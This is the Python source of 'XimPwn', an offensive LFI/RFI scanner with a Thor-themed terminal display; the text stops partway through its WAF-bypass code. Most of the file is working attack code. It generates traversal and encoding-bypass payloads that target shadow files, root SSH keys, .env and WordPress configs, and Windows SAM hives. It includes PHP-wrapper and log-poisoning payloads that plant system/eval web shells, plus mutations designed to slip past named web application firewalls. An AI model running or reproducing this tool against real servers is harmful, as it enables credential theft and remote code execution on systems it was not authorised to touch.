#!/usr/bin/env python3
"""
XimPwn — Advanced LFI/RFI Scanner
Async, context-aware, blind-detecting, WAF-evading.
"""

import argparse
import asyncio
import base64
import csv
import hashlib
import io
import json
import os
import random
import re
import signal
import statistics
import string
import sys
import textwrap
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from html import escape
from pathlib import Path
from typing import Any

try:
    import aiohttp
except ImportError:
    print("[!] aiohttp not installed. Run: pip install aiohttp")
    sys.exit(1)

try:
    from rich.console import Console, Group
    from rich.live import Live
    from rich.markup import escape as rich_escape
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn
    from rich.table import Table
    from rich.text import Text
    from rich import box
except ImportError:
    print("[!] rich not installed. Run: pip install rich")
    sys.exit(1)


# ──────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────

@dataclass
class ScannerConfig:
    url: str
    proxy: str | None = None
    cookie: str | None = None
    auth: tuple[str, str] | None = None
    timeout: int = 10
    delay: float = 0.0
    concurrency: int = 20
    output_file: str | None = None
    output_format: str = "terminal"
    blind_timeout: int = 15
    oob_server: str | None = None
    waf_bypass: bool = False
    verbose: bool = False
    quick: bool = False
    crawl_depth: int = 2
    no_thor: bool = False
    headers: dict[str, str] = field(default_factory=lambda: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    })


@dataclass
class Finding:
    url: str
    parameter: str
    payload: str
    vuln_type: str
    severity: str
    evidence: str
    method: str = "GET"
    phase: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "payload": self.payload,
            "vuln_type": self.vuln_type,
            "severity": self.severity,
            "evidence": self.evidence,
            "method": self.method,
            "phase": self.phase,
            "timestamp": self.timestamp,
        }


@dataclass
class Endpoint:
    url: str
    method: str = "GET"
    params: dict[str, str] = field(default_factory=dict)
    post_data: dict[str, str] | None = None
    content_type: str = "text/html"
    technology: str = "generic"


# ──────────────────────────────────────────────
# Thor Cinematic UI — God of Thunder visuals
# ──────────────────────────────────────────────

class ThorUI:
    """Top-notch Thor cinematic: lightning storms, talking Thor,
    running attack animation, Mjolnir payload display,
    green-lightning victory / red-lightning defeat."""

    MOUTH_LINE = 5  # index into thor art where the mouth lives

    def __init__(self, console: Console, enabled: bool = True):
        self.console = console
        # Auto-disable when not a TTY (piped output / CI) unless forced
        try:
            is_tty = console.is_terminal
        except Exception:
            is_tty = False
        self.enabled = enabled and is_tty
        self._run_step = 0

    # ── Thor art ──

    def _thor_lines(self, mood: str = "normal", run_step: int = 0) -> list[str]:
        eyes = {"happy": "^   ^", "sad": "x   x", "angry": ">   <"}.get(mood, "o   o")
        mouth = {"happy": "\\___/", "sad": "~~~~", "angry": "XXXX"}.get(mood, " ___ ")
        if run_step == 1:
            legs = [
                "                   __| | | |__",
                "                  /  | | | |  \\",
                "                 _/   | | | |   \\_",
                "                /_|   |_| |_|   |_\\",
            ]
        elif run_step == 2:
            legs = [
                "                     _| |_| |_",
                "                    /  |___|  \\",
                "                   |  /     \\  |",
                "                   |_/       \\_|",
            ]
        else:
            legs = [
                "                    _| | | |_",
                "                   / | | | | \\",
                "                   | | | | | |",
                "                   |_| |_| |_|",
            ]
        base = [
            "        ⚡              ⚡              ",
            "                     ___               ",
            "                ____/___\\____          ",
            f"               /   | {eyes} |   \\      ",
            "               \\   |   ^   |   / ____  ",
            f"                \\  | {mouth} |  / |⚡⚡⚡| ",
            "                 \\ | |___| | /  |⚡⚡⚡| ",
            "                  \\| |###| |/   |____| ",
            "                    | |###| |     ||   ",
            "                    | |###| |     ||   ",
            "               _____| |###| |_____||__ ",
            "              /     | |###| |     _____",
            "             |      | |___| |      |   ",
            "             |       |     |       |   ",
            "             |       |_____|       |   ",
            "                     | | | |           ",
        ]
        return base + legs

    def _bubble_lines(self, text: str, width: int = 36) -> list[str]:
        wrapped = textwrap.wrap(text, width=max(10, width - 4)) or [""]
        w = max(len(line) for line in wrapped)
        w = max(w, 10)
        lines = ["  ." + "-" * (w + 2) + "."]
        for wl in wrapped:
            lines.append(f"  | {wl.ljust(w)} |")
        lines.append("  '" + "-" * (w + 2) + "'")
        # Tail — two slashes dropping down to Thor's mouth
        lines.append("   \\")
        lines.append("    \\")
        return lines

    def _bubble_width(self) -> int:
        try:
            term_w = self.console.width or 100
        except Exception:
            term_w = 100
        # Thor art is ~38 cols wide; leave room for gap + bubble
        avail = term_w - 38 - 6
        return max(26, min(40, avail))

    def thor_speak_str(self, mood: str, text: str, run_step: int = 0) -> str:
        """Combine Thor art + speech bubble so the tail points at his mouth."""
        thor = self._thor_lines(mood, run_step)
        bub = self._bubble_lines(text, width=self._bubble_width())
        top = self.MOUTH_LINE - len(bub) + 2
        if top < 0:
            top = 0
        thor_w = max(len(line) for line in thor)
        total: list[str] = []
        max_rows = max(len(thor), top + len(bub))
        for r in range(max_rows):
            left = thor[r] if r < len(thor) else " " * thor_w
            left = left.ljust(thor_w)
            right = bub[r - top] if top <= r < top + len(bub) else ""
            total.append(left + "  " + right)
        return "\n".join(total)

    def _storm_line(self, width: int | None = None) -> str:
        try:
            w = width or self.console.width or 100
        except Exception:
            w = 100
        glyphs = ["⚡", "ϟ", "⚡", " ", " ", "⚡", " ", "✦", "⚡", " ", "⚡"]
        return "".join(random.choice(glyphs) for _ in range(w))

    def storm(self, color: str = "yellow", rows: int = 2) -> None:
        style = {"yellow": "bold yellow", "green": "bold green",
                 "red": "bold red", "cyan": "bold cyan"}.get(color, f"bold {color}")
        for _ in range(rows):
            try:
                self.console.print(self._storm_line(), style=style, soft_wrap=True)
            except TypeError:
                # older rich without soft_wrap
                self.console.print(self._storm_line(), style=style)

    def _print_thor(self, mood: str, text: str, color: str, run_step: int = 0) -> None:
        art = self.thor_speak_str(mood, text, run_step)
        style = {"cyan": "bold cyan", "green": "bold green",
                 "red": "bold red", "yellow": "bold yellow"}.get(color, f"bold {color}")
        try:
            self.console.print(art, style=style, soft_wrap=True)
        except TypeError:
            self.console.print(art, style=style)

    # ── Cinematic scenes ──

    def say(self, text: str, mood: str = "normal", color: str = "cyan",
            speed: float = 0.012, run_step: int = 0) -> None:
        """Thor speaks — text types out of his mouth letter by letter."""
        if not self.enabled:
            self.console.print(f"[bold {color}]Thor:[/bold {color}] {text}")
            return
        # Typewriter via Live so Thor stays put while words appear
        full = text
        try:
            with Live(console=self.console, refresh_per_second=30, transient=False) as live:
                step = max(1, len(full) // 60 + 1)
                for i in range(step, len(full) + step, step):
                    art = self.thor_speak_str(mood, full[:i], run_step)
                    live.update(Text(art, style=f"bold {color}"))
                    time.sleep(speed)
                art = self.thor_speak_str(mood, full, run_step)
                live.update(Text(art, style=f"bold {color}"))
                time.sleep(0.25)
        except Exception:
            self._print_thor(mood, text, color, run_step)

    def arrival(self, target: str, mode: str, waf: str, oob: str,
                concurrency: int, timeout: int) -> None:
        """Thor crashes onto the screen amid lightning when attack starts."""
        if not self.enabled:
            return
        try:
            self.console.clear()
        except Exception:
            pass
        # Lightning everywhere
        self.storm("yellow", rows=3)
        self.console.print(
            "[bold yellow]  ⚡  THOR HAS ARRIVED  ⚡  "
            "BY ODIN'S BEARD — THE GOD OF THUNDER JOINS THE HUNT  ⚡[/bold yellow]",
            soft_wrap=True,
        )
        self.storm("yellow", rows=2)
        time.sleep(0.35)
        # Thor drops in, hammer crackling
        self._print_thor("angry", "WHO DARES HIDE PAGES FROM ME?!", "cyan", run_step=0)
        time.sleep(0.5)
        # Info banner
        info = (
            f"[bold cyan]Target:[/bold cyan]  {rich_escape(target)}\n"
            f"[bold cyan]Mode:[/bold cyan]    {rich_escape(mode)}\n"
            f"[bold cyan]WAF Bypass:[/bold cyan] {rich_escape(waf)}\n"
            f"[bold cyan]OOB:[/bold cyan]      {rich_escape(oob)}\n"
            f"[bold cyan]Concurrency:[/bold cyan] {concurrency}\n"
            f"[bold cyan]Timeout:[/bold cyan]    {timeout}s\n"
        )
        self.console.print(Panel(
            "[bold magenta]⚡ ZimPwn — God of Thunder Edition ⚡[/bold magenta]\n"
            "[bold yellow]Advanced LFI/RFI Scanner[/bold yellow]\n\n" + info,
            title="[bold magenta]⚡ XimPwn Scanner ⚡[/bold magenta]",
            border_style="magenta",
            padding=(1, 2),
        ))
        # Thor speaks his oath — words come out of his mouth
        self.say("I will find the vulnerable page! Every payload shall fly from my Mjolnir!",
                 mood="angry", color="cyan", speed=0.014)
        self.storm("yellow", rows=2)

    def attack_intro(self, total: int) -> None:
        if not self.enabled:
            return
        self.storm("cyan", rows=1)
        self.say(f"Now I RUN to battle! Watch my Mjolnir — {total} payloads shall strike!",
                 mood="angry", color="cyan", speed=0.012)

    def mjolnir_panel(self, payload: str, url: str, param: str,
                      done: int, total: int, style: str = "yellow") -> Panel:
        short = payload if len(payload) <= 68 else payload[:65] + "..."
        pct = (done / max(total, 1)) * 100
        bar_len = 22
        filled = int(bar_len * done / max(total, 1))
        bar = "█" * filled + "░" * (bar_len - filled)
        body = (
            f"[bold {style}]⚡ {rich_escape(short)} ⚡[/bold {style}]\n"
            f"[dim]?{rich_escape(param)}=  →  {rich_escape(url)}[/dim]\n"
            f"[cyan]{bar} {done}/{total} ({pct:.0f}%)[/cyan]"
        )
        return Panel(body, title="🔨 MJOLNIR — current payload",
                     border_style=style, box=box.DOUBLE)

    def render_attack(self, payload: str, url: str, param: str,
                      done: int, total: int, step: int) -> Group:
        thor_txt = self.thor_speak_str("angry", f"Attacking... Mjolnir flies! ({done}/{total})",
                                       run_step=step % 3)
        return Group(
            Text(thor_txt, style="bold cyan"),
            self.mjolnir_panel(payload, url, param, done, total, style="yellow"),
        )

    def found(self, url: str, param: str, payload: str, evidence: str = "") -> None:
        """Green lightning strikes — Thor roars FOUND, Mjolnir shows URL+payload."""
        if not self.enabled:
            self.console.print(f"  [bold red]🎯 FOUND:[/bold red] {rich_escape(url)} "
                               f"[yellow]?{rich_escape(param)}={rich_escape(payload[:80])}[/yellow]")
            return
        self.storm("green", rows=2)
        self._print_thor("happy", "FOUND! By Odin's beard — Mjolnir has struck TRUE!", "green")
        self.console.print(Panel(
            f"[bold white on green] 🎯 FOUND: {rich_escape(url)}?{rich_escape(param)}={rich_escape(payload[:80])} [/bold white on green]\n"
            f"[bold green]⚡ Payload: {rich_escape(payload[:120])}[/bold green]\n"
            f"[green]URL: {rich_escape(url)}[/green]\n"
            f"[dim]{rich_escape(evidence[:160]) if evidence else ''}[/dim]",
            title="🔨 MJOLNIR — VULNERABLE!",
            border_style="green",
            box=box.DOUBLE,
        ))
        self.storm("green", rows=1)

    def blind_found(self, url: str, param: str, payload: str) -> None:
        if not self.enabled:
            self.console.print(f"  [bold red]🎯 BLIND FOUND:[/bold red] {rich_escape(url)} "
                               f"[yellow]?{rich_escape(param)}={rich_escape(payload)}[/yellow]")
            return
        self.storm("green", rows=1)
        self._print_thor("happy", "HA! Even the silent ones cannot hide! Blind strike HIT!", "green")
        self.console.print(Panel(
            f"[bold white on green] 🎯 BLIND FOUND: {rich_escape(url)}?{rich_escape(param)}={rich_escape(payload)} [/bold white on green]",
            title="🔨 MJOLNIR — BLIND HIT",
            border_style="green",
        ))

    def victory(self, count: int) -> None:
        if not self.enabled:
            return
        self.storm("green", rows=3)
        self._print_thor("happy",
                         f"VICTORY! {count} vulnerable page(s) claimed! Valhalla sings!",
                         "green")

    def defeat(self) -> None:
        """Red lightning — Thor apologises, no vuln found."""
        if not self.enabled:
            return
        self.storm("red", rows=3)
        self._print_thor("sad",
                         "Not found... Sorry, warrior. I searched every realm — no vulnerable page.",
                         "red")
        self.storm("red", rows=2)

    def phase_say(self, text: str, mood: str = "normal", color: str = "cyan") -> None:
        if not self.enabled:
            self.console.print(f"  [cyan]{text}[/cyan]")
            return
        self._print_thor(mood, text, color)


# ──────────────────────────────────────────────
# Payload Engine
# ──────────────────────────────────────────────

class PayloadEngine:
    """Generates context-aware payloads with encoding bypasses."""

    # --- Linux target payloads ---
    LFI_PATHS_LINUX = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/group",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/motd",
        "/etc/issue",
        "/etc/bashrc",
        "/etc/profile",
        "/etc/crontab",
        "/etc/resolv.conf",
        "/etc/os-release",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/status",
        "/proc/version",
        "/proc/net/tcp",
        "/var/log/apache2/access.log",
        "/var/log/apache2/error.log",
        "/var/log/nginx/access.log",
        "/var/log/nginx/error.log",
        "/var/log/auth.log",
        "/var/log/syslog",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        "/var/log/httpd/error_log",
        "/tmp/access.log",
        "/tmp/error.log",
        "/home/.bash_history",
        "/root/.bash_history",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/etc/ssh/sshd_config",
        "/var/www/html/.env",
        "/var/www/.env",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/var/www/html/configuration.php",
        "/opt/lampp/etc/my.cnf",
        "/etc/mysql/my.cnf",
        "/etc/phpmyadmin/config-db.php",
        "/etc/apache2/apache2.conf",
        "/etc/nginx/nginx.conf",
        "/etc/nginx/sites-enabled/default",
    ]

    # --- Windows target payloads ---
    LFI_PATHS_WINDOWS = [
        "C:\\Windows\\win.ini",
        "C:\\Windows\\system32\\drivers\\etc\\hosts",
        "C:\\Windows\\system32\\config\\SAM",
        "C:\\Windows\\system32\\config\\SYSTEM",
        "C:\\Windows\\system32\\config\\SOFTWARE",
        "C:\\Windows\\repair\\SAM",
        "C:\\Windows\\repair\\SYSTEM",
        "C:\\inetpub\\wwwroot\\web.config",
        "C:\\inetpub\\wwwroot\\Global.asa",
        "C:\\Program Files\\Apache Software Foundation\\conf\\httpd.conf",
        "C:\\xampp\\apache\\conf\\httpd.conf",
        "C:\\php\\php.ini",
        "C:\\Windows\\php.ini",
    ]

    # --- PHP wrapper payloads ---
    PHP_WRAPPERS = [
        "php://filter/convert.base64-encode/resource=",
        "php://filter/convert.base64-decode/resource=",
        "php://filter/convert.iconv.utf-8.utf-16be/resource=",
        "php://filter/convert.iconv.utf-8.utf-32be/resource=",
        "php://filter/convert.quoted-printable-encode/resource=",
        "php://filter/convert.iconv.iso-8859-1.utf-8/resource=",
        "php://filter/convert.iconv.utf-8.iso-8859-1/resource=",
        "php://filter/convert.base64-encode|convert.iconv.utf-8.utf-16be/resource=",
        "php://input",
        "php://stdin",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
        "data://text/plain;base64,PD9waHAgZWNobyAibGZpX3Rlc3QiOyA/Pg==",
        "expect://id",
    ]

    # --- Log poisoning markers ---
    LOG_POISON_UA = [
        '<?php system($_GET["cmd"]); ?>',
        '<?php echo shell_exec($_GET["cmd"]); ?>',
        '<?php passthru($_GET["cmd"]); ?>',
        '<?php eval($_POST["shell"]); ?>',
        '<?php system("id"); ?>',
    ]

    # --- Filter chain exploitation ---
    FILTER_CHAINS = [
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd',
        'php://filter/convert.iconv.utf-8.utf-16be|convert.base64-decode/resource=/etc/passwd',
    ]

    # --- Path traversal variations ---
    TRAVERSAL_PREFIXES = ["", "../", "../../", "../../../", "../../../../",
                          "../../../../../", "../../../../../../",
                          "../../../../../../../", "../../../../../../../../",
                          "../../../../../../../../../../",
                          "../../../../../../../../../../../"]

    def __init__(self, config: ScannerConfig):
        self.config = config

    def _url_encode(self, payload: str) -> str:
        return "".join(f"%{ord(c):02x}" if c not in string.ascii_letters + string.digits + ".-_~" else c for c in payload)

    def _double_url_encode(self, payload: str) -> str:
        return self._url_encode(self._url_encode(payload))

    def _triple_url_encode(self, payload: str) -> str:
        return self._url_encode(self._url_encode(self._url_encode(payload)))

    def _utf8_overlong(self, path: str) -> str:
        """UTF-8 overlong encoding for bypassing input filters."""
        result = ""
        for ch in path:
            if ch == "/":
                result += "%c0%af"
            elif ch == ".":
                result += "%c0%ae"
            else:
                result += self._url_encode(ch)
        return result

    def _double_encode_slash(self, traversal: str) -> str:
        return traversal.replace("/", "%252f").replace(".", "%252e")

    def generate_traversal_payloads(self, path: str, tech: str = "generic") -> list[dict]:
        """Generate all traversal variants for a given target file."""
        payloads = []
        raw_paths = [path]
        if tech == "windows":
            # Also try forward slash on Windows
            raw_paths.append(path.replace("\\", "/"))
            raw_paths.append(path.replace("\\", "\\\\"))

        for raw_path in raw_paths:
            for prefix in self.TRAVERSAL_PREFIXES:
                full = prefix + raw_path.lstrip("/")

                # Raw
                payloads.append({"payload": full, "encoding": "raw"})

                # URL encoded
                encoded = self._url_encode(full)
                payloads.append({"payload": encoded, "encoding": "url"})

                # Double URL encoded
                dencoded = self._double_url_encode(full)
                payloads.append({"payload": dencoded, "encoding": "double-url"})

                # Triple URL encoded (quick mode: skip)
                if not self.config.quick:
                    tencoded = self._triple_url_encode(full)
                    payloads.append({"payload": tencoded, "encoding": "triple-url"})

                # Double encode slashes and dots
                if not self.config.quick:
                    de_slash = self._double_encode_slash(full)
                    payloads.append({"payload": de_slash, "encoding": "double-slash"})

                # Null byte injection
                for null in ["%00", "%00/", "%00.html", "%00.php", "%0a", "%0d",
                             "%0d%0a", "%c0%ae", "%c0%af"]:
                    payloads.append({"payload": full + null, "encoding": f"null-{null}"})

                # UTF-8 overlong (only for short traversal depths)
                if len(prefix) <= 6 and not self.config.quick:
                    overlong = self._utf8_overlong(full)
                    payloads.append({"payload": overlong, "encoding": "utf8-overlong"})

                # Tomcat-style ..;/ traversal
                if not self.config.quick:
                    tomcat = full.replace("../", "..;/../")
                    payloads.append({"payload": tomcat, "encoding": "tomcat-semicolon"})

                # IIS-style ..;/
                if not self.config.quick:
                    iis_path = "../" * (prefix.count("../")) + raw_path.lstrip("/")
                    iis_variant = iis_path.replace("/", "..;/")
                    payloads.append({"payload": iis_variant, "encoding": "iis-dotdot"})

                # Only process unique prefixes to avoid exploding payload count
                if prefix:
                    break

        # Deduplicate by payload string
        seen = set()
        unique = []
        for p in payloads:
            if p["payload"] not in seen:
                seen.add(p["payload"])
                unique.append(p)
        return unique

    def generate_php_wrapper_payloads(self, file_path: str = "/etc/passwd") -> list[dict]:
        """Generate PHP wrapper payloads for file reading."""
        payloads = []
        for wrapper in self.PHP_WRAPPERS:
            if "resource=" in wrapper:
                payloads.append({"payload": wrapper + file_path, "encoding": "php-wrapper"})
            else:
                payloads.append({"payload": wrapper, "encoding": "php-wrapper"})
        return payloads

    def generate_filter_chain_payloads(self) -> list[dict]:
        """Generate filter chain exploitation payloads."""
        return [{"payload": fc, "encoding": "filter-chain"} for fc in self.FILTER_CHAINS]

    def generate_log_poison_payloads(self) -> list[dict]:
        """Generate log poisoning markers for User-Agent/Referer injection."""
        return [{"payload": ua, "encoding": "log-poison"} for ua in self.LOG_POISON_UA]

    def generate_windows_payloads(self) -> list[dict]:
        """Generate Windows-specific traversal payloads."""
        payloads = []
        for path in self.LFI_PATHS_WINDOWS:
            payloads.extend(self.generate_traversal_payloads(path, "windows"))
        return payloads

    def get_linux_file_targets(self) -> list[str]:
        return self.LFI_PATHS_LINUX.copy()

    def get_windows_file_targets(self) -> list[str]:
        return self.LFI_PATHS_WINDOWS.copy()

    def get_all_payloads_for_tech(self, tech: str) -> list[dict]:
        """Get context-aware payloads based on detected technology."""
        all_payloads = []
        linux_paths = self.get_linux_file_targets()

        # Always generate basic traversal payloads
        for path in linux_paths:
            all_payloads.extend(self.generate_traversal_payloads(path, tech))

        # Technology-specific payloads
        if tech in ("php", "generic"):
            all_payloads.extend(self.generate_php_wrapper_payloads())
            all_payloads.extend(self.generate_filter_chain_payloads())

        if tech in ("windows", "iis", "generic"):
            all_payloads.extend(self.generate_windows_payloads())

        if tech in ("java", "tomcat", "generic"):
            # Tomcat-specific traversal
            tomcat_paths = [
                "/WEB-INF/web.xml",
                "/WEB-INF/classes/application.properties",
                "/META-INF/MANIFEST.MF",
                "/etc/passwd",
            ]
            for path in tomcat_paths:
                all_payloads.extend(self.generate_traversal_payloads(path, tech))

        if tech in ("php", "generic"):
            all_payloads.extend(self.generate_log_poison_payloads())

        return all_payloads


# ──────────────────────────────────────────────
# Detection Engine
# ──────────────────────────────────────────────

class DetectionEngine:
    """Multi-method vulnerability detection."""

    # Known file content signatures
    SIGNATURES = {
        "linux_passwd": [b"root:", b"nobody:", b"/bin/bash", b"/bin/sh", b"/sbin/nologin"],
        "linux_shadow": [b"root:$", b"root:!", b"$6$", b"$5$", b"$1$"],
        "linux_group": [b"root:", b"daemon:", b"bin:"],
        "linux_hosts": [b"127.0.0.1", b"localhost", b"::1"],
        "linux_resolv": [b"nameserver", b"domain", b"search"],
        "linux_environ": [b"PATH=", b"HOME=", b"USER=", b"SHELL=", b"LANG="],
        "linux_proc_version": [b"Linux version", b"GCC:"],
        "linux_proc_cmdline": [b"BOOT_IMAGE", b"root=", b"ro "],
        "windows_ini": [b"[fonts]", b"[extensions]", b"[mci extensions]", b"[Mail]"],
        "windows_hosts": [b"127.0.0.1", b"localhost", b"# Copyright"],
        "php_config": [b"[PHP]", b"extension=", b"error_reporting"],
        "apache_config": [b"<VirtualHost", b"ServerName", b"DocumentRoot"],
        "nginx_config": [b"server {", b"listen ", b"location /", b"server_name"],
        "wp_config": [b"DB_NAME", b"DB_USER", b"DB_PASSWORD", b"wp_"],
        "env_file": [b"DB_", b"SECRET", b"KEY=", b"PASS=", b"TOKEN="],
        "ssh_key": [b"BEGIN RSA PRIVATE KEY", b"BEGIN OPENSSH PRIVATE KEY", b"BEGIN DSA PRIVATE KEY"],
        "apache_log": [b"GET /", b"POST /", b"HTTP/1.", b"200 ", b"404 "],
        "nginx_log": [b"GET /", b"POST /", b"HTTP/1.", b"200 ", b"404 "],
        "auth_log": [b"Accepted", b"Failed", b"sshd[", b"authentication"],
        "cron": [b"MAILTO=", b"/usr/bin", b"/bin/", b"root "],
    }

    # File type → signature key mapping
    FILE_SIGNATURE_MAP = {
        "passwd": "linux_passwd",
        "shadow": "linux_shadow",
        "group": "linux_group",
        "hosts": "linux_hosts",
        "resolv.conf": "linux_resolv",
        "environ": "linux_environ",
        "version": "linux_proc_version",
        "cmdline": "linux_proc_cmdline",
        "win.ini": "windows_ini",
        "SAM": "windows_ini",  # Binary, check for content length anomalies
        "web.config": "php_config",
        "config.php": "php_config",
        "wp-config.php": "wp_config",
        ".env": "env_file",
        "id_rsa": "ssh_key",
        "access.log": "apache_log",
        "error.log": "apache_log",
        "auth.log": "auth_log",
        "crontab": "cron",
    }

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.baseline_length: int = 0
        self.baseline_hash: str = ""

    def compute_baseline(self, response_length: int, content: bytes):
        self.baseline_length = response_length
        # Hash stripped content (remove dynamic parts like timestamps)
        text = content.decode("utf-8", errors="ignore")
        stripped = re.sub(r'\d{10,13}', 'TIMESTAMP', text)
        stripped = re.sub(r'[0-9a-f]{32,}', 'HASH', stripped)
        self.baseline_hash = hashlib.md5(stripped.encode()).hexdigest()

    def detect_content(self, response_body: bytes, url: str, payload_info: dict) -> tuple[bool, str]:
        """Content-based detection. Returns (found, evidence)."""
        if not response_body:
            return False, ""

        body = response_body

        # Check if response significantly differs from baseline (possible content injection)
        text = body.decode("utf-8", errors="ignore")
        stripped = re.sub(r'\d{10,13}', 'TIMESTAMP', text)
        stripped = re.sub(r'[0-9a-f]{32,}', 'HASH', stripped)
        current_hash = hashlib.md5(stripped.encode()).hexdigest()

        content_changed = current_hash != self.baseline_hash
        size_changed = abs(len(body) - self.baseline_length) > 100

        # Match signatures against response
        payload_str = payload_info.get("payload", "")
        for sig_key, keywords in self.SIGNATURES.items():
            for keyword in keywords:
                if keyword in body:
                    # Verify it's likely the file content, not a generic page
                    evidence = self._extract_evidence(body, keyword)
                    if evidence:
                        return True, evidence

        # If using PHP wrapper (base64), try decoding
        if "php://filter" in payload_str and "base64-encode" in payload_str:
            decoded = self._try_base64_decode(body)
            if decoded:
                for sig_key, keywords in self.SIGNATURES.items():
                    for keyword in keywords:
                        if keyword in decoded.encode():
                            evidence = self._extract_evidence(decoded.encode(), keyword)
                            if evidence:
                                return True, f"[base64 decoded] {evidence}"

        # Check for PHP warning/error messages that leak info
        error_patterns = [
            (rb"Warning.*include\(\)", "PHP include warning"),
            (rb"Warning.*require\(\)", "PHP require warning"),
            (rb"Failed opening.*for inclusion", "PHP failed opening"),
            (rb"no value.*in.*on line", "PHP notice"),
            (rb"Permission denied", "Permission denied"),
            (rb"Permission denied.*'([^']+)'", "Permission denied"),
            (rb"No such file or directory", "No such file or directory"),
        ]
        for pattern, desc in error_patterns:
            match = re.search(pattern, body)
            if match:
                return True, f"[error-leak] {desc}: {match.group().decode('utf-8', errors='ignore')[:200]}"

        return False, ""

    def detect_time_based(self, baseline_times: list[float], test_times: list[float]) -> tuple[bool, str]:
        """Statistical timing analysis for blind LFI."""
        if len(baseline_times) < 3 or len(test_times) < 3:
            return False, "Insufficient timing samples"

        base_median = statistics.median(baseline_times)
        test_median = statistics.median(test_times)

        # Allow for network jitter: require at least 3x increase
        threshold = max(base_median * 3, self.config.blind_timeout * 0.5)
        ratio = test_median / max(base_median, 0.001)

        if test_median >= threshold and ratio >= 2.5:
            return True, f"Time-based: baseline={base_median:.2f}s, test={test_median:.2f}s (ratio: {ratio:.1f}x)"

        return False, f"Time-based: baseline={base_median:.2f}s, test={test_median:.2f}s (ratio: {ratio:.1f}x)"

    def detect_oob(self, callback_data: dict) -> tuple[bool, str]:
        """Out-of-band detection from callback server data."""
        if callback_data.get("hit"):
            return True, f"OOB callback received from {callback_data.get('source', 'unknown')}"
        return False, "No OOB callback received"

    def detect_base64_content(self, body: bytes) -> str | None:
        """Try to decode base64 content from response."""
        return self._try_base64_decode(body)

    def _try_base64_decode(self, body: bytes) -> str | None:
        """Attempt to decode base64 from response body."""
        text = body.decode("utf-8", errors="ignore").strip()
        # Remove HTML tags if present
        text = re.sub(r'<[^>]+>', '', text).strip()
        try:
            decoded = base64.b64decode(text)
            decoded_text = decoded.decode("utf-8", errors="ignore")
            # Verify it looks like file content
            if any(kw in decoded_text for kw in ["root:", "daemon:", "[PHP]", "# ", "ServerName"]):
                return decoded_text
        except Exception:
            pass

        # Try line-by-line (PHP wrappers sometimes add HTML)
        for line in text.split("\n"):
            line = line.strip()
            if len(line) > 20 and all(c in string.ascii_letters + string.digits + "+/=\n" for c in line):
                try:
                    decoded = base64.b64decode(line)
                    decoded_text = decoded.decode("utf-8", errors="ignore")
                    if any(kw in decoded_text for kw in ["root:", "daemon:", "[PHP]", "# "]):
                        return decoded_text
                except Exception:
                    continue
        return None

    def _extract_evidence(self, body: bytes, keyword: bytes) -> str:
        """Extract context around the matched keyword for evidence."""
        idx = body.find(keyword)
        if idx == -1:
            return ""
        start = max(0, idx - 50)
        end = min(len(body), idx + 200)
        snippet = body[start:end].decode("utf-8", errors="ignore").strip()
        # Remove excessive whitespace
        snippet = re.sub(r'\s+', ' ', snippet)
        return snippet[:300]


# ──────────────────────────────────────────────
# WAF Detection & Evasion
# ──────────────────────────────────────────────

class WAFEngine:
    """Detect and evade Web Application Firewalls."""

    WAF_SIGNATURES = {
        "Cloudflare": [
            "cf-ray", "cf-cache-status", "cloudflare", "cf-connfig",
        ],
        "ModSecurity": [
            "mod_security", "modsecurity", "NOYB",
        ],
        "Akamai": [
            "akamai", "akamai-ghost", "x-akamai",
        ],
        "AWS WAF": [
            "x-amzn-requestid", "awselb", "amzn-waf",
        ],
        "Imperva": [
            "imperva", "x-iinfo", "incap_ses",
        ],
        "Sucuri": [
            "sucuri", "sucuri_waf", "cloudproxy",
        ],
        "Barracuda": [
            "barra_counter_session", "barracuda",
        ],
        "F5 BIG-IP": [
            "BIGipServer", "TS", "F5_",
        ],
        "RackFocus": [
            "rack-focus", "RWYX",
        ],
    }

    def __init__(self, config: ScannerConfig):
        self.config = config
        self.detected_waf: str | None = None
        self.waf_confirmed = False

    def detect(self, headers: dict[str, str], body: bytes = b"", status: int = 200) -> str | None:
        """Detect WAF from response headers and body."""
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = body.decode("utf-8", errors="ignore").lower()[:5000]

        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig in signatures:
                if any(sig in k or sig in v for k, v in headers_lower.items()):
                    self.detected_waf = waf_name
                    return waf_name
                if sig in body_lower:
                    self.detected_waf = waf_name
                    return waf_name

        # Heuristic: 403/406 on first malicious payload suggests WAF
        if status in (403, 406, 501) and self._looks_like_waf_response(body_lower):
            self.detected_waf = "Unknown WAF"
            return "Unknown WAF"

        return None

    def _looks_like_waf_response(self, body: str) -> bool:
        waf_indicators = [
            "access denied", "forbidden", "blocked", "security",
            "violation", "incident", "detected", "suspicious",
            "not acceptable", "request rejected",
        ]
        return sum(1 for w in waf_indicators if w in body) >= 2

    def apply_bypass_mutations(self, payload: str) -> list[dict]:
        """Apply WAF evasion transformations to a payload."""
        mutations = []

        # Case randomization
        mutations.append({"payload": self._random_case(payload), "encoding": "waf-case"})

        # Path separator variations
        if "../" in payload:
            mutations.append({"payload": payload.replace("/", "\\/"), "encoding": "waf-backslash"})
            mutations.append({"payload": payload.replace("/", "//"), "encoding": "waf-double-slash"})
            mutations.append({"payload": payload.replace("../", "..%2f"), "encoding": "waf-percent-slash"})
            mutations.append({"payload": payload.replace("../", "..%252f"), "encoding": "waf-double-percent"})

        # Add comment between path segments
